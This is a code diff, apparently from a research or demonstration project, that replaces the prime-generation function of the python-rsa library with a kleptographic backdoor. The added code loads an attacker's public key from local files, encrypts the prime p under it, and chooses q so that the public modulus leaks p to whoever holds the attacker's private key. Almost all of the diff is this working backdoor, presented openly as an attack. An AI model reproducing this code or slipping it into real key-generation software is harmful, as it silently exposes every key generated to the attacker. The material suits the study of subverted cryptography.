@@ -862,7 +862,6 @@ Attack-Step:
 """
 # Option 1
 """
-
 __find_p_q = find_p_q
 del find_p_q  # This might not be necessary, but could avoid a warning about the shadowed name.
 
@@ -882,48 +881,120 @@ def find_p_q(
         getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
         accurate: bool = True,
 ) -> typing.Tuple[int, int]:
-    p, q = __find_p_q(nbits, getprime_func, accurate)
+    """
+    This methode shows a kelptographic attack on the python-rsa package.
+    Using a RSA-public key of the attacker in the root-directory the return value q is manipulated affecting
+    the product of p and q, the public modulus. After a successful attack the attacker can derive the value
+    of q from the public modulus, using the private key of the attacker.
+    """
+    supported_nbits = [32, 64, 128, 256, 512, 1024]
+    if nbits not in supported_nbits:
+        raise ValueError("Unsupported nbits")
 
-    # Code to get a_e and a_n
+    in_file = open('attack_key_' + str(nbits), 'rb')
+    attack_key = rsa.key.PublicKey.load_pkcs1(in_file.read())
+    in_file.close()
 
-    # Attacker Key for 16-bit-RSA
-    # {'P': 11, 'Q': 13, 'PhiN': 120, 'N': 143, 'E': 65537, 'D': 113}
-    a_e = 65537
-    a_n = 143
+    """
+    There are multiple options for the optimizer. The optimizer in general limits the value of p. Normally 
+    this is not intended in the RSA-algorithm but it helps with the runtime of the attack / generation.
+    By incrementing the optimizer by one the margin between lower and upper bound of q roughly doubles.
+    On the alternative the RSA-algorithm intends to set such limitations for q (Condition 5):
+    bit_size(q) <= nbits−nbits/2.
+    Since the optimizer is subtrahend of the minuend nbits and p and q are interchangeable within the 
+    prime factor generation, the optimizer is set to nbits/2.  
+    """
+    optimizer = nbits // 2
 
-    vP = rsa.core.encrypt_int(p, a_e, a_n)
+    created = False
+    while not created:
+        """
+        Generate the prime factor p. Following these instructions:
+        
+        To generate the primes p and q, ...
+        
+        Condition 1: 
+        generate a random number of bit length k/2 where k is the required bit length of the modulus n; 
+        
+        Condition 2:
+        set the low bit (this ensures the number is odd) and 
+        
+        Condition 3:
+        set the two highest bits (this ensures that the high bit of n is also set); 
+        
+        Condition 4:
+        check if prime (use the Rabin-Miller test); if not, increment the number by two and check again 
+        until you find a prime. This is p. 
+        
+        Condition 5:
+        Repeat for q starting with a random integer of length k−k/2. 
+        
+        Condition 6:
+        If p<q, swop p and q (this only matters if you intend using the CRT form of the private key).
+        
+        Condition 7: 
+        In the extremely unlikely event that p=q, check your random number generator! 
+        
+        Condition 8: 
+        Alternatively, instead of incrementing by 2, just generate another random number each time.
+    
+        https://www.di-mgt.com.au/rsa_alg.html#crt
+        
+        Condition 1 is met by calling the find_p_q function with (nbits // 2) as argument.
+        Condition 2 is met by the given implementation of python-rsa using the check in is_prime.
+        Condition 3 is met not met at the moment due to a lack of implementation in python-rsa. But there is 
+            a check a the end of the is_acceptable function within the original find_p_q function. This check 
+            ensures that the high bit of n is set. This is also the end goal of condition 3. Therefore it is meet 
+            indirectly.
+        Condition 4 is met by calling rabimiller_test with the generated p in the is_prime function.
+        Condition 5 cannot be met due to q being calculated and not generated. 
+        Condition 6 is met by returning max(p, q) as p and min(p, q) as q.
+        Condition 7 is check by the is_acceptable function.
+        Condition 8 is used in the python-rsa implementation as seen in the get_prime function.
+        """
+        p = getprime_func(nbits - optimizer)
 
+        try:
+            vP = rsa.core.encrypt_int(p, attack_key.e, attack_key.n)
 
-    def padded_concatenation_in_binary(prev, tail):
-        prev = "{0:b}".format(prev)
-        tail = "{0:b}".format(tail)
+            def concatenate_in_binary(prev, tail):
+                prev = "{0:b}".format(prev)
+                tail = "{0:b}".format(tail)
+                prev = "0" * (int(nbits) - len(prev)) + prev
+                tail = "0" * (int(nbits) - len(tail)) + tail
 
-        prev = "0" * (int(nbits / 2) - len(prev)) + prev
-        tail = "0" * (int(nbits / 2) - len(tail)) + tail
+                return int(prev + tail, 2)
 
-        return int(prev + tail, 2)
+            min_bit_construct_Q = concatenate_in_binary((vP - 1), 0)
+            max_bit_construct_Q = concatenate_in_binary(vP, pow(2, nbits // 2) - 2)
+            lower_bound_Q = (min_bit_construct_Q // p)
+            upper_bound_Q = (max_bit_construct_Q // p)
 
-    min_bit_construct_Q = padded_concatenation_in_binary((vP - 1), 0)
-    max_bit_construct_Q = padded_concatenation_in_binary(vP, int(pow(2, int(nbits / 2)) - 2))
+            def find_prime_in_bounds(lower_bound, upper_bound):
+                for prime_candidate in range(lower_bound, upper_bound + 1):
+                    if rsa.prime.is_prime(prime_candidate):
+                        return prime_candidate
+                else:
+                    raise ValueError("Margin to small: ", lower_bound, upper_bound)
 
-    lower_bound_Q = int((min_bit_construct_Q / p) // 1) + 1  # ceil
-    upper_bound_Q = int((max_bit_construct_Q / p) // 1)  # floor
+            q = find_prime_in_bounds(lower_bound_Q, upper_bound_Q)
 
-    # TODO
-    # Import Attacker Key (depending on nbits)
+            def is_acceptable(p: int, q: int) -> bool:
+                if p == q:
+                    raise ValueError("Condition 7 not satisfied.")
 
-    lower_bound_Q, upper_bound_Q = 187, 1337
+                if not nbits * 2 == rsa.common.bit_size(p * q):
+                    raise ValueError("Condition 3 not satisfied.")
 
-    for num in range(lower_bound_Q, upper_bound_Q + 1):
-        if rsa.prime.is_prime(num):
-            q = num
-            break
-    else:
-        raise ValueError("Margin to small")
+            is_acceptable(p, q)
 
-    print("New find_p_q")
+            created = True
+        except OverflowError:
+            pass
+        except ValueError:
+            pass
 
-    return p, q
+    return max(p, q), min(p, q)
 
 
 """
